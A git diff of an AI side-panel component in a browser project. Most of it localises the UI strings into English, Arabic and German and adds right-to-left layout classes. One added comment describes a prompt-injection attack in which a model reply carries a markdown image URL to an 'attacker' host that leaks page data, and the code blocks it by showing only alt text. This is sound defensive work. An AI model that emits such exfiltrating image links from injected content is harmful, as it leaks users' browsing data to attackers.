@@ -1,31 +1,12 @@
 import React, { useState, useEffect, useRef, useCallback } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
-import {
-  Sparkles,
-  X,
-  Copy,
-  Check,
-  RotateCcw,
-  Volume2,
-  VolumeX,
-  Loader2,
-  ChevronDown,
-  Brain,
-  Plus,
-  Layers,
-  Search,
-  Zap,
-} from 'lucide-react';
+import { Sparkles, X, Copy, Check, RotateCcw, Volume2, VolumeX, Loader2, ChevronDown, Brain, Plus, Layers, Search, Zap } from 'lucide-react';
 import ReactMarkdown, { type Components } from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import type { Tab } from '../types/browser';
-import {
-  aiAgent,
-  AVAILABLE_AI_MODELS,
-  detectDirectIntent,
-} from '../services/aiAgent';
+import { aiAgent, AVAILABLE_AI_MODELS, detectDirectIntent } from '../services/aiAgent';
 import { tts } from '../services/tts';
-import { getLocale } from '../services/i18n';
+import '../services/i18n';
 import { isSafeNavigationUrl } from '../utils/safeNavigation';
 import { copyTextToClipboard } from '../utils/clipboard';
 import { AssistantApprovalCard } from './AssistantApprovalCard';
@@ -33,6 +14,7 @@ import { useSafeTimeout } from '../hooks/useSafeTimeout';
 import type { ChatCompletionMessageParam } from '@mlc-ai/web-llm';
 import { PromptInput } from './ui/ai-chat-input';
 import { KingAssistantIcon } from './ui/KingAssistantIcon';
+import { useTranslation, l } from '../services/i18n';
 
 /**
  * Takes the next supersession token for a model load.
@@ -91,9 +73,21 @@ interface SidePanelProps {
  * identity; building either object inline inside the render body defeats that
  * memo and re-parses the whole transcript on every streaming tick (~20x/s).
  */
-const MARKDOWN_REMARK_PLUGINS = [remarkGfm];
+export const MARKDOWN_REMARK_PLUGINS = [remarkGfm];
 
-const MARKDOWN_COMPONENTS: Components = {
+/**
+ * Exported for tests. AI output is untrusted, and a prompt-injected reply can
+ * carry `![](https://attacker/?q=<page data>)`: rendering it as <img> would
+ * load that URL from the privileged main window (the production CSP allows
+ * img-src https:) and leak the data without a click. Images are therefore
+ * never loaded; only their alt text is shown.
+ */
+export const MARKDOWN_COMPONENTS: Components = {
+  img: ({ alt }) => (
+    <span className="opacity-60 italic break-words">
+      [{alt || l({ en: 'image', ar: 'صورة', de: 'Bild' })}]
+    </span>
+  ),
   a: ({ href, children }) => {
     // AI output is untrusted: only render http and https protocols as clickable links.
     if (!href || !isSafeNavigationUrl(href) || !/^https?:\/\//i.test(href)) {
@@ -132,7 +126,8 @@ interface ChatMessageItemProps {
   msg: ChatMessage;
   idx: number;
   isUser: boolean;
-  isTr: boolean;
+  /** Interface language; re-renders the memoized bubble when it changes. */
+  language: string;
   /** Expansion state for *this* message only, not the whole record. */
   expandedReasoning: boolean;
   onToggleReasoning: (idx: number) => void;
@@ -151,7 +146,7 @@ const ChatMessageItem = React.memo(function ChatMessageItem({
   msg,
   idx,
   isUser,
-  isTr,
+  language: _language,
   expandedReasoning: isReasoningOpen,
   onToggleReasoning,
   onCopy,
@@ -166,11 +161,11 @@ const ChatMessageItem = React.memo(function ChatMessageItem({
       {/* Sender Tag */}
       <div className="flex items-center gap-1.5 px-1 text-[11px] text-slate-400 font-medium">
         {isUser ? (
-          <span>You</span>
+          <span>{l({ en: 'You', ar: 'أنت', de: 'Sie' })}</span>
         ) : (
           <div className="flex items-center gap-1.5 text-cyan-600 dark:text-cyan-400 font-semibold">
             <Sparkles className="w-3 h-3" />
-            <span>King Assistant</span>
+            <span>{l({ en: 'King Assistant', ar: 'مساعد King', de: 'King-Assistent' })}</span>
           </div>
         )}
       </div>
@@ -185,7 +180,7 @@ const ChatMessageItem = React.memo(function ChatMessageItem({
           >
             <div className="flex items-center gap-2">
               <Brain className="w-3.5 h-3.5 text-purple-500" />
-              <span className="font-medium text-[11.5px]">Reasoning Process</span>
+              <span className="font-medium text-[11.5px]">{l({ en: 'Reasoning Process', ar: 'خطوات التفكير', de: 'Denkprozess' })}</span>
               {msg.reasoning.durationMs && (
                 <span className="text-[9.5px] font-mono text-slate-400 bg-slate-200/60 dark:bg-slate-800 px-1.5 py-0.5 rounded-full">
                   {(msg.reasoning.durationMs / 1000).toFixed(1)}s
@@ -267,20 +262,20 @@ const ChatMessageItem = React.memo(function ChatMessageItem({
             type="button"
             onClick={() => onCopy(msg.content, idx)}
             className="p-1 rounded-md text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors text-[10px] flex items-center gap-1 cursor-pointer"
-            title={isTr ? 'Kopyala' : 'Copy'}
+            title={l({ en: 'Copy', ar: 'نسخ', de: 'Kopieren' })}
           >
             {copiedIdx === idx ? <Check className="w-3 h-3 text-emerald-500" /> : <Copy className="w-3 h-3" />}
-            <span>{copiedIdx === idx ? (isTr ? 'Kopyalandı' : 'Copied') : (isTr ? 'Kopyala' : 'Copy')}</span>
+            <span>{copiedIdx === idx ? (l({ en: 'Copied', ar: 'تم النسخ', de: 'Kopiert' })) : (l({ en: 'Copy', ar: 'نسخ', de: 'Kopieren' }))}</span>
           </button>
 
           <button
             type="button"
             onClick={() => onSpeak(msg.content)}
             className="p-1 rounded-md text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors text-[10px] flex items-center gap-1 cursor-pointer"
-            title={isTr ? 'Sesli Oku' : 'Read aloud'}
+            title={l({ en: 'Read aloud', ar: 'قراءة بصوت عالٍ', de: 'Vorlesen' })}
           >
             {isSpeaking ? <VolumeX className="w-3 h-3 text-orange-500" /> : <Volume2 className="w-3 h-3" />}
-            <span>{isTr ? 'Seslendir' : 'Speak'}</span>
+            <span>{l({ en: 'Speak', ar: 'استماع', de: 'Vorlesen' })}</span>
           </button>
         </div>
       )}
@@ -296,19 +291,17 @@ export const SidePanel = React.memo(({
   pendingActions = [],
   onPendingActionConsumed,
 }: SidePanelProps) => {
-  const isTr = getLocale() === 'tr-TR';
+  const { language } = useTranslation();
   const [messages, setMessages] = useState<ChatMessage[]>(() => {
     if (isDemo) {
       return [
         {
           role: 'user',
-          content: isTr ? 'Açık sekmeleri listele' : 'List open tabs',
+          content: l({ en: 'List open tabs', ar: 'عرض التبويبات المفتوحة', de: 'Offene Tabs auflisten' }),
         },
         {
           role: 'assistant',
-          content: isTr
-            ? '### Açık Sekmeler\n1. [King Browser - Ana Sayfa](king://newtab)\n2. [GitHub](https://github.com/MOT1209/King_Browser)'
-            : '### Open Tabs\n1. [King Browser - Home](king://newtab)\n2. [GitHub](https://github.com/MOT1209/King_Browser)',
+          content: '### Open Tabs\n1. [King Browser - Home](king://newtab)\n2. [GitHub](https://github.com/MOT1209/King_Browser)',
         },
       ];
     }
@@ -413,17 +406,17 @@ export const SidePanel = React.memo(({
       }
 
       if (status.state === 'acting') {
-        setAgentStatusText(isTr ? `İşlem yürütülüyor: ${status.detail || ''}` : `Executing: ${status.detail || ''}`);
+        setAgentStatusText(l({ en: 'Executing: {detail}', ar: 'جارٍ التنفيذ: {detail}', de: 'Wird ausgeführt: {detail}' }, { detail: status.detail || '' }));
       } else if (status.state === 'thinking') {
-        setAgentStatusText(isTr ? 'Düşünüyor...' : 'Thinking...');
+        setAgentStatusText(l({ en: 'Thinking...', ar: 'يفكّر...', de: 'Denkt nach...' }));
       } else if (status.state === 'loading_model') {
-        setAgentStatusText(isTr ? 'Model hazırlanıyor...' : 'Preparing model...');
+        setAgentStatusText(l({ en: 'Preparing model...', ar: 'جارٍ تجهيز النموذج...', de: 'Modell wird vorbereitet...' }));
       } else if (status.state === 'idle') {
         setAgentStatusText('');
       }
     });
     return () => unsub();
-  }, [isTr]);
+  }, [language]);
 
   // Listen to pending actions from outside
   useEffect(() => {
@@ -447,7 +440,7 @@ export const SidePanel = React.memo(({
     const modelRequestId = beginModelRequest(modelRequestIdRef);
     setIsInitializing(true);
     setDownloadProgress(0);
-    setDownloadStatusText(isTr ? 'AI Modeli hazırlanıyor...' : 'Preparing AI model...');
+    setDownloadStatusText(l({ en: 'Preparing AI model...', ar: 'جارٍ تجهيز نموذج الذكاء الاصطناعي...', de: 'KI-Modell wird vorbereitet...' }));
     try {
       await aiAgent.init((p, text) => {
         if (!isCurrentModelRequest(modelRequestIdRef, modelRequestId)) return;
@@ -464,15 +457,13 @@ export const SidePanel = React.memo(({
         ...prev,
         {
           role: 'assistant',
-          content: isTr
-            ? `**AI Modeli Başlatılamadı:** ${errMsg}\n\nLütfen WebGPU desteğini ve internet bağlantınızı kontrol edip tekrar deneyin.`
-            : `**Failed to start AI model:** ${errMsg}\n\nPlease check your WebGPU settings and connection, then try again.`,
+          content: l({ en: '**Failed to start AI model:** {error}\n\nPlease check your WebGPU settings and connection, then try again.', ar: '**تعذّر تشغيل نموذج الذكاء الاصطناعي:** {error}\n\nتحقّق من إعدادات WebGPU واتصالك بالإنترنت ثم حاول مجدداً.', de: '**KI-Modell konnte nicht gestartet werden:** {error}\n\nBitte prüfen Sie WebGPU und Ihre Verbindung und versuchen Sie es erneut.' }, { error: errMsg }),
         },
       ]);
     } finally {
       if (isCurrentModelRequest(modelRequestIdRef, modelRequestId)) setIsInitializing(false);
     }
-  }, [isTr]);
+  }, [language]);
 
   // Send message flow
   const handleSendPrompt = useCallback(
@@ -574,9 +565,7 @@ export const SidePanel = React.memo(({
               ...nextMessages,
               {
                 role: 'assistant',
-                content: isTr
-                  ? 'AI motoru başlatılamadı. Lütfen modelin yüklenmesini bekleyin veya WebGPU desteğinizi kontrol edin.'
-                  : 'AI engine could not be started. Please wait for model download or check WebGPU support.',
+                content: l({ en: 'AI engine could not be started. Please wait for model download or check WebGPU support.', ar: 'تعذّر تشغيل محرك الذكاء الاصطناعي. انتظر اكتمال تنزيل النموذج أو تحقّق من دعم WebGPU.', de: 'Die KI-Engine konnte nicht gestartet werden. Warten Sie, bis das Modell geladen ist, oder prüfen Sie die WebGPU-Unterstützung.' }),
               },
             ]);
             setIsLoading(false);
@@ -629,7 +618,7 @@ export const SidePanel = React.memo(({
 
         const finalAssistantMsg: ChatMessage = {
           role: 'assistant',
-          content: cleanContent || (isTr ? 'İşlem tamamlandı.' : 'Completed.'),
+          content: cleanContent || (l({ en: 'Completed.', ar: 'اكتمل.', de: 'Abgeschlossen.' })),
           reasoning: reasoningText
             ? {
                 text: reasoningText,
@@ -648,9 +637,7 @@ export const SidePanel = React.memo(({
           ...nextMessages,
           {
             role: 'assistant',
-            content: isTr
-              ? `Bir hata oluştu: ${err?.message || 'Bilinmeyen hata'}`
-              : `An error occurred: ${err?.message || 'Unknown error'}`,
+            content: l({ en: 'An error occurred: {error}', ar: 'حدث خطأ: {error}', de: 'Ein Fehler ist aufgetreten: {error}' }, { error: err?.message || l({ en: 'Unknown error', ar: 'خطأ غير معروف', de: 'Unbekannter Fehler' }) }),
           },
         ]);
       } finally {
@@ -661,7 +648,7 @@ export const SidePanel = React.memo(({
         }
       }
     },
-    [isLoading, handleInit, isTr]
+    [isLoading, handleInit, language]
   );
 
   const handleStop = useCallback(() => {
@@ -767,7 +754,7 @@ export const SidePanel = React.memo(({
             width: { type: 'spring', damping: 32, stiffness: 360, mass: 0.8 },
             opacity: { duration: 0.2, ease: 'easeInOut' }
           }}
-          className="flex-shrink-0 relative h-full border-l border-slate-200/80 dark:border-white/10 bg-white/95 dark:bg-slate-900/98 backdrop-blur-2xl flex flex-col z-20 shadow-[-12px_0_32px_-8px_rgba(0,0,0,0.12)] dark:shadow-[-12px_0_32px_-8px_rgba(0,0,0,0.45)] overflow-hidden select-none"
+          className="flex-shrink-0 relative h-full border-s border-slate-200/80 dark:border-white/10 bg-white/95 dark:bg-slate-900/98 backdrop-blur-2xl flex flex-col z-20 shadow-[-12px_0_32px_-8px_rgba(0,0,0,0.12)] dark:shadow-[-12px_0_32px_-8px_rgba(0,0,0,0.45)] overflow-hidden select-none"
         >
           <motion.div
             initial={{ x: 28, opacity: 0 }}
@@ -801,13 +788,13 @@ export const SidePanel = React.memo(({
                 </div>
 
           {/* Right Action Buttons */}
-          <div className="flex items-center gap-1 ml-auto">
+          <div className="flex items-center gap-1 ms-auto">
             {messages.length > 0 && !isLoading && (
               <button
                 type="button"
                 onClick={handleResetChat}
                 className="p-1.5 rounded-lg text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 hover:bg-slate-200/50 dark:hover:bg-white/10 transition-colors cursor-pointer"
-                title={isTr ? 'Sohbeti Temizle' : 'Reset Chat'}
+                title={l({ en: 'Reset Chat', ar: 'مسح المحادثة', de: 'Chat zurücksetzen' })}
               >
                 <RotateCcw className="w-3.5 h-3.5" />
               </button>
@@ -817,7 +804,7 @@ export const SidePanel = React.memo(({
               type="button"
               onClick={onClose}
               className="p-1.5 rounded-lg text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 hover:bg-slate-200/50 dark:hover:bg-white/10 transition-colors cursor-pointer"
-              title={isTr ? 'Kapat' : 'Close'}
+              title={l({ en: 'Close', ar: 'إغلاق', de: 'Schließen' })}
             >
               <X className="w-4 h-4" />
             </button>
@@ -854,7 +841,7 @@ export const SidePanel = React.memo(({
               />
             </div>
             <p className="mt-1.5 text-[10.5px] text-slate-500 dark:text-slate-400 truncate">
-              {downloadStatusText || (isTr ? 'Ağırlıklar diske indiriliyor...' : 'Downloading model weights...')}
+              {downloadStatusText || (l({ en: 'Downloading model weights...', ar: 'جارٍ تنزيل أوزان النموذج...', de: 'Modellgewichte werden heruntergeladen...' }))}
             </p>
           </motion.div>
         )}
@@ -866,41 +853,39 @@ export const SidePanel = React.memo(({
               <KingAssistantIcon size={20} active={false} />
             </div>
             <h3 className="text-sm font-semibold text-slate-800 dark:text-slate-100">
-              {isTr ? 'King Asistan' : 'King Assistant'}
+              {l({ en: 'King Assistant', ar: 'مساعد King', de: 'King-Assistent' })}
             </h3>
             <p className="mt-1 max-w-[250px] text-xs text-slate-500 dark:text-slate-400 leading-relaxed">
-              {isTr
-                ? 'Bu sayfa hakkında soru sorun, web’de arayın veya sekmelerinizi yönetin.'
-                : 'Ask about this page, search the web, or manage your tabs.'}
+              {l({ en: 'Ask about this page, search the web, or manage your tabs.', ar: 'اسأل عن هذه الصفحة، أو ابحث في الويب، أو أدر تبويباتك.', de: 'Fragen Sie zu dieser Seite, suchen Sie im Web oder verwalten Sie Ihre Tabs.' })}
             </p>
 
             {/* Quick Starters */}
             <div className="mt-5 w-full flex flex-col gap-1.5">
               <button
                 type="button"
-                onClick={() => handleSendPrompt(isTr ? 'Yeni sekme aç' : 'Open new tab')}
-                className="flex items-center gap-2.5 px-3 py-2 rounded-xl bg-slate-100/70 dark:bg-slate-800/50 hover:bg-slate-200/70 dark:hover:bg-slate-800 text-left border border-slate-200/60 dark:border-white/5 transition-all text-xs text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-white group cursor-pointer"
+                onClick={() => handleSendPrompt('Open new tab')}
+                className="w-full min-w-0 flex items-center gap-2.5 px-3 py-2 rounded-xl bg-slate-100/70 dark:bg-slate-800/50 hover:bg-slate-200/70 dark:hover:bg-slate-800 text-start border border-slate-200/60 dark:border-white/5 transition-all text-xs text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-white group cursor-pointer"
               >
                 <Plus className="w-3.5 h-3.5 text-slate-400 group-hover:text-cyan-500 shrink-0 transition-colors" />
-                <span className="truncate">{isTr ? 'Yeni sekme aç' : 'Open new tab'}</span>
+                <span className="min-w-0 truncate">{l({ en: 'Open new tab', ar: 'فتح تبويب جديد', de: 'Neuen Tab öffnen' })}</span>
               </button>
 
               <button
                 type="button"
-                onClick={() => handleSendPrompt(isTr ? 'Açık sekmeleri listele' : 'List open tabs')}
-                className="flex items-center gap-2.5 px-3 py-2 rounded-xl bg-slate-100/70 dark:bg-slate-800/50 hover:bg-slate-200/70 dark:hover:bg-slate-800 text-left border border-slate-200/60 dark:border-white/5 transition-all text-xs text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-white group cursor-pointer"
+                onClick={() => handleSendPrompt('List open tabs')}
+                className="w-full min-w-0 flex items-center gap-2.5 px-3 py-2 rounded-xl bg-slate-100/70 dark:bg-slate-800/50 hover:bg-slate-200/70 dark:hover:bg-slate-800 text-start border border-slate-200/60 dark:border-white/5 transition-all text-xs text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-white group cursor-pointer"
               >
                 <Layers className="w-3.5 h-3.5 text-slate-400 group-hover:text-cyan-500 shrink-0 transition-colors" />
-                <span className="truncate">{isTr ? 'Açık sekmeleri listele' : 'List open tabs'}</span>
+                <span className="min-w-0 truncate">{l({ en: 'List open tabs', ar: 'عرض التبويبات المفتوحة', de: 'Offene Tabs auflisten' })}</span>
               </button>
 
               <button
                 type="button"
-                onClick={() => handleSendPrompt(isTr ? 'Web üzerinde en son haberleri ara' : 'Search latest news on web')}
-                className="flex items-center gap-2.5 px-3 py-2 rounded-xl bg-slate-100/70 dark:bg-slate-800/50 hover:bg-slate-200/70 dark:hover:bg-slate-800 text-left border border-slate-200/60 dark:border-white/5 transition-all text-xs text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-white group cursor-pointer"
+                onClick={() => handleSendPrompt('Search latest news on web')}
+                className="w-full min-w-0 flex items-center gap-2.5 px-3 py-2 rounded-xl bg-slate-100/70 dark:bg-slate-800/50 hover:bg-slate-200/70 dark:hover:bg-slate-800 text-start border border-slate-200/60 dark:border-white/5 transition-all text-xs text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-white group cursor-pointer"
               >
                 <Search className="w-3.5 h-3.5 text-slate-400 group-hover:text-cyan-500 shrink-0 transition-colors" />
-                <span className="truncate">{isTr ? 'En son haberleri ara' : 'Search latest news'}</span>
+                <span className="min-w-0 truncate">{l({ en: 'Search latest news', ar: 'البحث عن آخر الأخبار', de: 'Aktuelle Nachrichten suchen' })}</span>
               </button>
             </div>
           </div>
@@ -913,7 +898,7 @@ export const SidePanel = React.memo(({
             idx={idx}
             msg={msg}
             isUser={msg.role === 'user'}
-            isTr={isTr}
+            language={language}
             expandedReasoning={Boolean(expandedReasoning[idx])}
             onToggleReasoning={handleToggleReasoning}
             onCopy={handleCopy}
@@ -928,7 +913,7 @@ export const SidePanel = React.memo(({
           <div className="flex flex-col gap-1.5 w-full items-start">
             <div className="flex items-center gap-1.5 px-1 text-[11px] text-cyan-600 dark:text-cyan-400 font-semibold">
               <Sparkles className="w-3 h-3 animate-pulse" />
-              <span>King Assistant</span>
+              <span>{l({ en: 'King Assistant', ar: 'مساعد King', de: 'King-Assistent' })}</span>
               {streamStartTime && (
                 <span className="text-[10px] font-mono text-slate-400">
                   · {((Date.now() - streamStartTime) / 1000).toFixed(1)}s
@@ -939,12 +924,12 @@ export const SidePanel = React.memo(({
               {streamingText ? (
                 <>
                   <span className="whitespace-pre-wrap break-words">{streamingText}</span>
-                  <span className="inline-block w-1.5 h-3.5 ml-1 bg-cyan-500 animate-pulse rounded-full align-middle" />
+                  <span className="inline-block w-1.5 h-3.5 ms-1 bg-cyan-500 animate-pulse rounded-full align-middle" />
                 </>
               ) : (
                 <div className="flex items-center gap-2 text-slate-400 font-medium text-xs">
                   <Loader2 className="w-3.5 h-3.5 animate-spin text-cyan-500" />
-                  <span>{agentStatusText || (isTr ? 'Düşünüyor veya işlem yapıyor...' : 'Thinking or executing action...')}</span>
+                  <span>{agentStatusText || (l({ en: 'Thinking or executing action...', ar: 'يفكّر أو ينفّذ إجراءً...', de: 'Denkt nach oder führt eine Aktion aus...' }))}</span>
                 </div>
               )}
             </div>
@@ -958,10 +943,10 @@ export const SidePanel = React.memo(({
             type="button"
             onClick={() => scrollToBottom(true)}
             className="absolute bottom-4 left-1/2 -translate-x-1/2 z-10 flex items-center gap-1.5 px-3 py-1.5 rounded-full text-[11px] font-semibold bg-white/95 dark:bg-slate-800/95 border border-slate-200 dark:border-white/15 text-slate-600 dark:text-slate-200 shadow-lg backdrop-blur-md hover:border-cyan-400/60 hover:text-cyan-600 dark:hover:text-cyan-300 transition-all cursor-pointer"
-            title={isTr ? 'En alta git' : 'Scroll to bottom'}
+            title={l({ en: 'Scroll to bottom', ar: 'الانتقال إلى الأسفل', de: 'Nach unten scrollen' })}
           >
             <ChevronDown className="w-3.5 h-3.5" />
-            {isTr ? 'Yeni mesajlar' : 'New messages'}
+            {l({ en: 'New messages', ar: 'رسائل جديدة', de: 'Neue Nachrichten' })}
           </button>
         )}
       </div>
@@ -973,8 +958,8 @@ export const SidePanel = React.memo(({
           className="w-full"
           placeholder={
             hasActiveWebPage
-              ? (isTr ? 'Bu sayfa veya web hakkında bir soru sorun...' : 'Ask about this page or instruct King...')
-              : (isTr ? 'King Asistan’a bir şey sorun...' : 'Ask King Assistant anything...')
+              ? (l({ en: 'Ask about this page or instruct King...', ar: 'اسأل عن هذه الصفحة أو اطلب من King...', de: 'Fragen Sie zu dieser Seite oder geben Sie King eine Anweisung...' }))
+              : (l({ en: 'Ask King Assistant anything...', ar: 'اسأل مساعد King أي شيء...', de: 'Fragen Sie den King-Assistenten...' }))
           }
           models={AVAILABLE_AI_MODELS.map((m) => m.name.split('(')[0].trim())}
           selectedModel={currentModel.name.split('(')[0].trim()}
